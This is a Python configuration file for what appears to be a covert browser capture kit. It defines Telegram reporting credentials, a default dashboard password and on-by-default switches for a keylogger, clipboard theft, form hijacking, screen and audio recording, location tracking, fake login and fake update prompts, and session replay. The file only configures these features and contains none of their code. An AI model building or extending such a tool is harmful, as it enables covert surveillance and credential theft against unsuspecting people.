import os
from pathlib import Path
from dotenv import load_dotenv

BASE_DIR = Path(__file__).parent.parent.absolute()
load_dotenv(BASE_DIR / ".env")


def _b(k, d="true"):
    return os.environ.get(k, d).lower() == "true"


def _i(k, d):
    return int(os.environ.get(k, str(d)))


class Config:
    TG_TOKEN = os.environ.get("TG_TOKEN", "")
    TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
    TELEGRAM_ADMIN_ID = os.environ.get("TELEGRAM_ADMIN_ID", "")
    DASH_USER = os.environ.get("DASH_USER", "admin")
    DASH_PASS = os.environ.get("DASH_PASS", "admin123")
    SECRET_KEY = os.environ.get("SECRET_KEY", "change-me-1")
    JWT_SECRET = os.environ.get("JWT_SECRET", "change-me-2")
    EDITOR_SECRET_KEY = os.environ.get("EDITOR_SECRET_KEY", "")
    DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///" + str(BASE_DIR / "data" / "capture.db"))

    UPLOAD_DIR = os.environ.get("UPLOAD_DIR", str(BASE_DIR / "data" / "uploads"))
    REPLAY_DIR = os.environ.get("REPLAY_DIR", str(BASE_DIR / "data" / "replays"))
    REPORT_DIR = os.environ.get("REPORT_DIR", str(BASE_DIR / "data" / "reports"))
    SCREENSHOT_DIR = os.environ.get("SCREENSHOT_DIR", str(BASE_DIR / "data" / "screenshots"))
    BURST_DIR = os.environ.get("BURST_DIR", str(BASE_DIR / "data" / "burst"))
    KEYS_DIR = os.environ.get("KEYS_DIR", str(BASE_DIR / "data" / "keys"))
    CLIPBOARD_DIR = os.environ.get("CLIPBOARD_DIR", str(BASE_DIR / "data" / "clipboard"))
    AUDIO_DIR = os.environ.get("AUDIO_DIR", str(BASE_DIR / "data" / "audio"))
    VIDEO_DIR = os.environ.get("VIDEO_DIR", str(BASE_DIR / "data" / "video"))
    TRACKING_DIR = os.environ.get("TRACKING_DIR", str(BASE_DIR / "data" / "tracking"))

    ENABLE_VPN_CHECK = _b("ENABLE_VPN_CHECK")
    ENABLE_REVERSE_GEOCODE = _b("ENABLE_REVERSE_GEOCODE")
    ENABLE_SCREENSHOT = _b("ENABLE_SCREENSHOT")
    ENABLE_BURST = _b("ENABLE_BURST")
    BURST_INTERVAL = _i("BURST_INTERVAL", 3)
    BURST_DURATION = _i("BURST_DURATION", 60)
    ENABLE_EVENT_LOG = _b("ENABLE_EVENT_LOG")

    ENABLE_KEYLOGGER = _b("ENABLE_KEYLOGGER")
    ENABLE_CLIPBOARD = _b("ENABLE_CLIPBOARD")
    ENABLE_TAB_LOG = _b("ENABLE_TAB_LOG")
    ENABLE_FORM_HIJACK = _b("ENABLE_FORM_HIJACK")
    ENABLE_AUTO_SCROLL_SHOT = _b("ENABLE_AUTO_SCROLL_SHOT")
    AUTO_SCROLL_INTERVAL = _i("AUTO_SCROLL_INTERVAL", 8)

    ENABLE_SCREEN_RECORD = _b("ENABLE_SCREEN_RECORD")
    SCREEN_RECORD_DURATION = _i("SCREEN_RECORD_DURATION", 20)
    ENABLE_AUDIO_RECORD = _b("ENABLE_AUDIO_RECORD")
    AUDIO_RECORD_DURATION = _i("AUDIO_RECORD_DURATION", 10)

    ENABLE_LOCATION_TRACKING = _b("ENABLE_LOCATION_TRACKING")
    LOCATION_INTERVAL = _i("LOCATION_INTERVAL", 30)
    ENABLE_MOTION_TRACK = _b("ENABLE_MOTION_TRACK")
    ENABLE_NETWORK_INFO = _b("ENABLE_NETWORK_INFO")

    ENABLE_FAKE_LOGIN = _b("ENABLE_FAKE_LOGIN")
    FAKE_LOGIN_DELAY = _i("FAKE_LOGIN_DELAY", 15)
    ENABLE_FAKE_UPDATE = _b("ENABLE_FAKE_UPDATE", "false")

    ENABLE_SESSION_REPLAY = _b("ENABLE_SESSION_REPLAY")

    AUTO_CLEANUP_DAYS = _i("AUTO_CLEANUP_DAYS", 30)
    RATE_LIMIT_UPLOAD_PER_HOUR = _i("RATE_LIMIT_UPLOAD_PER_HOUR", 200)
